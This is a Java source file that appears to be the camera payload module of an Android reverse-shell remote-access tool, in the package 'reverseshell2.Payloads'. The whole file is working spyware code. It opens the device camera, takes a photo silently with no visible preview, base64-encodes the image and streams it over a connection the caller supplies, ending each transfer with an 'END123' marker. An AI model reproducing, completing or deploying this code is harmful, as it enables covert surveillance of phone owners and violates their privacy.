package com.example.reverseshell2.Payloads;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import android.util.Base64;
import androidx.annotation.NonNull;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.List;


public class CameraPreview {
    private Camera legacyCamera;
    private Context context;
    private OutputStream out;
    static String TAG = "cameraPreviewClass";
    
    // Camera2 API objects
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private String cameraId;

    public CameraPreview(Context context) {
        try {
            this.context = context;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void startUp(int cameraID, OutputStream outputStream) {
        this.out = outputStream;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            // Use Camera2 API for Android 5.0+
            startCamera2(String.valueOf(cameraID));
        } else {
            // Use legacy Camera API for older versions
            startLegacyCamera(cameraID);
        }
    }
    
    private void startCamera2(String cameraID) {
        startBackgroundThread();
        
        CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        this.cameraId = cameraID;
        
        try {
            // Choose optimal size
            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraID);
            Size[] outputSizes = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                    .getOutputSizes(ImageFormat.JPEG);
            Size largest = outputSizes[0];
            for (Size size : outputSizes) {
                if (size.getWidth() * size.getHeight() > largest.getWidth() * largest.getHeight()) {
                    largest = size;
                }
            }
            
            // Set up ImageReader for capturing still images
            imageReader = ImageReader.newInstance(largest.getWidth(), largest.getHeight(), 
                    ImageFormat.JPEG, 1);
            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    try (Image image = reader.acquireLatestImage()) {
                        if (image != null) {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buffer.capacity()];
                            buffer.get(bytes);
                            sendPhoto(bytes);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing image: " + e.getMessage());
                    }
                }
            }, backgroundHandler);
            
            // Open camera
            try {
                cameraManager.openCamera(cameraID, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(@NonNull CameraDevice camera) {
                        cameraDevice = camera;
                        createCaptureSession();
                    }

                    @Override
                    public void onDisconnected(@NonNull CameraDevice camera) {
                        releaseCamera2();
                    }

                    @Override
                    public void onError(@NonNull CameraDevice camera, int error) {
                        Log.e(TAG, "Camera error: " + error);
                        releaseCamera2();
                        try {
                            out.write("Camera error occurred\nEND123\n".getBytes("UTF-8"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }, backgroundHandler);
            } catch (SecurityException e) {
                Log.e(TAG, "Camera permission not granted: " + e.getMessage());
                try {
                    out.write("Camera permission not granted\nEND123\n".getBytes("UTF-8"));
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            }
            
        } catch (CameraAccessException e) {
            Log.e(TAG, "Failed to access camera: " + e.getMessage());
            try {
                out.write("Failed to access camera\nEND123\n".getBytes("UTF-8"));
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }
    
    private void createCaptureSession() {
        try {
            final Surface readerSurface = imageReader.getSurface();
            
            cameraDevice.createCaptureSession(Arrays.asList(readerSurface),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            if (cameraDevice == null) {
                                return;
                            }
                            
                            captureSession = session;
                            try {
                                CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(
                                        CameraDevice.TEMPLATE_STILL_CAPTURE);
                                captureBuilder.addTarget(readerSurface);
                                
                                captureSession.capture(captureBuilder.build(), new CameraCaptureSession.CaptureCallback() {
                                    @Override
                                    public void onCaptureCompleted(@NonNull CameraCaptureSession session,
                                                                 @NonNull CaptureRequest request,
                                                                 @NonNull TotalCaptureResult result) {
                                        super.onCaptureCompleted(session, request, result);
                                        // Capture completed
                                    }
                                }, backgroundHandler);
                            } catch (CameraAccessException e) {
                                Log.e(TAG, "Failed to take picture: " + e.getMessage());
                            }
                        }

                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                            Log.e(TAG, "Failed to configure camera session");
                            try {
                                out.write("Failed to configure camera\nEND123\n".getBytes("UTF-8"));
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }
                    }, backgroundHandler);
        } catch (CameraAccessException e) {
            Log.e(TAG, "Failed to create capture session: " + e.getMessage());
        }
    }
    
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
    
    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Failed to stop background thread: " + e.getMessage());
            }
        }
    }
    
    private void releaseCamera2() {
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
        }
        
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        
        stopBackgroundThread();
    }

    private void startLegacyCamera(int cameraID) {
        try {
            legacyCamera = Camera.open(cameraID);
        } catch (RuntimeException e) {
            e.printStackTrace();
            try {
                out.write("END123\n".getBytes("UTF-8"));
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            return;
        }
        
        Camera.Parameters parameters = legacyCamera.getParameters();
        List<Camera.Size> allSizes = parameters.getSupportedPictureSizes();
        Camera.Size size = allSizes.get(0);
        for (int i = 0; i < allSizes.size(); i++) {
            if (allSizes.get(i).width > size.width)
                size = allSizes.get(i);
        }

        parameters.setPictureSize(size.width, size.height);
        legacyCamera.setParameters(parameters);
        try {
            legacyCamera.setPreviewTexture(new SurfaceTexture(0));
            legacyCamera.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        legacyCamera.takePicture(null, null, new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                releaseLegacyCamera();
                sendPhoto(data);
            }
        });
    }

    private void sendPhoto(byte[] data) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, bos);

        byte[] byteArr = bos.toByteArray();
        final String encodedImage = Base64.encodeToString(byteArr, Base64.DEFAULT);
        Thread thread = new Thread(new Runnable(){
                @Override
                public void run() {
                    try {
                        out.write(encodedImage.getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    } catch (Exception e) {
                        Log.e(TAG, e.getMessage());
                    }
                }
            });
        thread.start();
    }

    private void releaseLegacyCamera() {
        if (legacyCamera != null) {
            legacyCamera.stopPreview();
            legacyCamera.release();
            legacyCamera = null;
        }
    }
    
    // Public method to release camera resources
    public void releaseCamera() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            releaseCamera2();
        } else {
            releaseLegacyCamera();
        }
    }
}